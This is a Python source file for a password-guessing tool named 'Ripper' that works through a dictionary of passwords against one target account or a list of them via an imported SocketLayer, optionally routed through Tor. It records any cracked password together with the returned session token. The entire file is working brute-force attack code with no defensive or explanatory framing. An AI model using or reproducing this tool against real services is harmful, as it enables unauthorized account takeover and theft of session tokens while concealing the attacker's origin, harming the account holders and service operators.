from ripper.SocketLayer import SocketLayer
import json


class Ripper:
    dictionary = None

    def __init__(self, dictionary=None, use_tor=False):
        if dictionary is None:
            self.dictionary = "resources/dictionary.json"
        else:
            self.dictionary = dictionary
        self.socket = SocketLayer(use_tor)

    def execute(self, targets):
        results = []
        result = {}
        with open(self.dictionary, 'r') as dictionary_values:
            words = json.load(dictionary_values)
        if type(targets) is list:
            for targets in targets:
                for password in words:
                    response = self.socket.try_login(targets, password)
                    if 'token' in response:
                        result = {'user': targets, 'password': password, 'token': response['token']}
                        break
                    result = {'user': targets, 'error': response['error']}
                results.append(result)
        elif type(targets) is str:
            for password in words:
                response = self.socket.try_login(targets, password)
                if 'token' in response:
                    result = {'user': targets, 'password': password, 'token': response['token']}
                    break
                result = {'user': targets, 'error': response['error']}
            results.append(result)
        else:
            raise Exception("The inserted users' type is not valid")
        return results
